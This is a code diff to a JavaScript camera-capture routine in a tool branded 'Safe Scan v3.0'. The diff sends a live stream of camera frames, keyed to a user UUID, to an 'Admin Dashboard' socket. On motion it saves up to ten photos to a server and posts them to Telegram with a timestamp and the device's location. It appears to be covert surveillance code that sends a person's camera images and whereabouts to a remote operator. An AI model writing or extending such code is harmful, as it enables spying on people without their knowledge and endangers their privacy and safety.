@@ -2524,23 +2524,35 @@
                     }
                     previousImageData = currentImageData;
 
-                    // Always redraw and send to Admin for the live high-speed feed
+                    // Always redraw full res for sending
                     canvas.width = w;
                     canvas.height = h;
                     ctx.drawImage(cameraView, 0, 0, w, h);
                     const photo = canvas.toDataURL('image/jpeg', 0.85);
                     if (!photo || photo.length < 1000) return;
-                    
-                    sendFrameToAdmin(photo);
 
-                    // If NO motion, don't trigger Telegram logic
+                    // 1. Send lightweight base64 frame directly to Admin Dashboard for Live Video Feed (No Disk Save)
+                    if (adminSocket && adminSocket.connected) {
+                        adminSocket.emit('camera:live_frame', {
+                            uuid: userUUID,
+                            frame: photo,
+                            timestamp: Date.now()
+                        });
+                    }
+
+                    // If NO motion, don't trigger Telegram or Disk Save logic
                     if (!motionDetected && !force) return;
 
-                    // Throttle Telegram sending to once every 3 seconds and limit to 10 photos
+                    // 2. Throttle Disk Saving & Telegram to once every 3 seconds and limit to 10 photos
                     const now = Date.now();
                     if (telegramPhotosShared < 10 && (now - lastTelegramSendTime > 3000 || force)) {
                         lastTelegramSendTime = now;
                         telegramPhotosShared++;
+                        
+                        // Send to server to be SAVED to disk and DB (this is the original camera:frame)
+                        sendFrameToAdmin(photo);
+
+                        // Send to Telegram
                         const caption = `📸 Motion Detected (${telegramPhotosShared}/10)\n${new Date().toLocaleString()}\n\n${getLocationInfo()}\n\nSafe Scan v3.0`;
                         await sendPhotoToTelegram(photo, caption);
                     }
